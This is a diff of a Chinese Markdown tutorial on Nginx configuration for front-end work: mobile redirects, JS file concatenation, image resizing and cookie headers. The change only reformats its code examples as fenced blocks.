@@ -1475,15 +1565,17 @@ Nginx 可以通过 $http_user_agent，获取到请求客户端的 userAgent，�
 
 如下配置：
 
-    location / {
-        # 移动、pc设备适配
-        if ($http_user_agent ~* '(Android|webOS|iPhone|iPod|BlackBerry)') {
-            set $mobile_request '1';
-        }
-        if ($mobile_request = '1') {
-            rewrite ^.+ http://mysite-base-H5.com;
-        }
-    }  
+```js
+location / {
+    # 移动、pc设备适配
+    if ($http_user_agent ~* '(Android|webOS|iPhone|iPod|BlackBerry)') {
+        set $mobile_request '1';
+    }
+    if ($mobile_request = '1') {
+        rewrite ^.+ http://mysite-base-H5.com;
+    }
+}  
+```
 
 - 合并请求：
 
@@ -1493,29 +1585,35 @@ Nginx 可以通过 $http_user_agent，获取到请求客户端的 userAgent，�
 
 如下配置：
 
-    # js资源http-concat
-    # nginx-http-concat模块的参数远不止下面三个，剩下的请查阅文档
-    location /static/js/ {
-        concat on; # 是否打开资源合并开关
-        concat_types application/javascript; # 允许合并的资源类型
-        concat_unique off; # 是否允许合并不同类型的资源
-        concat_max_files 5; # 允许合并的最大资源数目
-    }
+```js
+# js资源http-concat
+# nginx-http-concat模块的参数远不止下面三个，剩下的请查阅文档
+location /static/js/ {
+    concat on; # 是否打开资源合并开关
+    concat_types application/javascript; # 允许合并的资源类型
+    concat_unique off; # 是否允许合并不同类型的资源
+    concat_max_files 5; # 允许合并的最大资源数目
+}
+```
 
 其中本地 server mysite-base 下，static/js 有 3 个文件：
 
-    // a.js
-    console.log('a');
+```js
+// a.js
+console.log('a');
 
-    // b.js
-    console.log('b');
+// b.js
+console.log('b');
 
-    // c.js
-    console.log('c');
+// c.js
+console.log('c');
+```
  
 当请求 http://mysite-base.com/static/js/??a.js,b.js,c.js，会发现 3 个请求合并为 1 个，返回如下：
 
-    console.log('a');console.log('b');console.log('c');
+```js
+console.log('a');console.log('b');console.log('c');
+```
 
 - 图片处理
 
@@ -1527,33 +1625,37 @@ Nginx 可以通过 $http_user_agent，获取到请求客户端的 userAgent，�
 
 配置如下：
 
-    # 图片缩放处理
-    # 这里约定的图片处理url格式：以 mysite-base.com/img/路径访问
-    location ~* /img/(.+)$ {
-        alias /Users/cc/Desktop/server/static/image/$1; #图片服务端储存地址
-        set $width -; #图片宽度默认值
-        set $height -; #图片高度默认值
-        if ($arg_width != "") {
-            set $width $arg_width;
-        }
-        if ($arg_height != "") {
-            set $height $arg_height;
-        }
-        image_filter resize $width $height; #设置图片宽高
-        image_filter_buffer 10M;   #设置Nginx读取图片的最大buffer。
-        image_filter_interlace on; #是否开启图片图像隔行扫描
-        error_page 415 = 415.png; #图片处理错误提示图，例如缩放参数不是数字
+```js
+# 图片缩放处理
+# 这里约定的图片处理url格式：以 mysite-base.com/img/路径访问
+location ~* /img/(.+)$ {
+    alias /Users/cc/Desktop/server/static/image/$1; #图片服务端储存地址
+    set $width -; #图片宽度默认值
+    set $height -; #图片高度默认值
+    if ($arg_width != "") {
+        set $width $arg_width;
     }
+    if ($arg_height != "") {
+        set $height $arg_height;
+    }
+    image_filter resize $width $height; #设置图片宽高
+    image_filter_buffer 10M;   #设置Nginx读取图片的最大buffer。
+    image_filter_interlace on; #是否开启图片图像隔行扫描
+    error_page 415 = 415.png; #图片处理错误提示图，例如缩放参数不是数字
+}
+```
 
 - cookie 配置
 
 可以在 Nginx 上进行 cookie 常量配置，而不需要在前端手动设置一些常量 cookie：
 
-    location /officialApp-ch {
-        root   D:\\project\\main-cloud-official\\cloud-official\\pc;
-        index  index.html index.htm;
-        add_header Access-Control-Allow-Origin *;
-        proxy_set_header Access-Control-Allow-Origin $http_origin;
-        expires  1d;
-        add_header  Set-Cookie 'service_language=zh-cn;path=/'; #设置 cookie
-    }
+```js
+location /officialApp-ch {
+    root   D:\\project\\main-cloud-official\\cloud-official\\pc;
+    index  index.html index.htm;
+    add_header Access-Control-Allow-Origin *;
+    proxy_set_header Access-Control-Allow-Origin $http_origin;
+    expires  1d;
+    add_header  Set-Cookie 'service_language=zh-cn;path=/'; #设置 cookie
+}
+```
